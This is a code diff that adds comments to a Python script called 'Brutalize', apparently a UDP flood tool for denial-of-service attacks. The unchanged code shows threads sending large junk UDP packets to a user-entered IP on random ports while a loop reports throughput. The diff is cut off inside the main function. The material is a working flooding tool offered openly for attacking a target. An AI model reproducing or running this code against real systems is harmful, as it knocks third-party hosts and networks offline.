@@ -1,9 +1,11 @@
+# Import required libraries
 from socket import socket, AF_INET, SOCK_DGRAM
 from threading import Thread
 from random import choices, randint
 from time import time, sleep
 from getpass import getpass as hinput
 
+# Define the Brutalize class
 class Brutalize:
     def __init__(self, ip, port, force, threads):
         self.ip = ip
@@ -14,12 +16,16 @@ class Brutalize:
         # self.data = self._randbytes()
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
+    
+    # Start flooding attack    
     def flood(self):
         self.on = True
         self.sent = 0
         for _ in range(self.threads):
             Thread(target=self.send).start()
         Thread(target=self.info).start()
+    
+    # Display attack info    
     def info(self):
         interval = 0.05
         now = time()
@@ -41,8 +47,12 @@ class Brutalize:
             size = round(self.sent * bytediff / mb)
             self.sent = 0
             now += 1
+            
+    # Stop the attack        
     def stop(self):
         self.on = False
+        
+    # Send packets    
     def send(self):
         while self.on:
             try:
@@ -50,11 +60,13 @@ class Brutalize:
                 self.sent += self.len
             except:
                 pass
+    # Generate a random address with the target IP and a random port        
     def _randaddr(self):
         return (self.ip, self._randport())
+    # Generate a random port number
     def _randport(self):
         return self.port or randint(1, 65535)
-
+# Main function to execute the script
 def main():
     ip = input("Enter the IP to Brutalize: ")
     try:
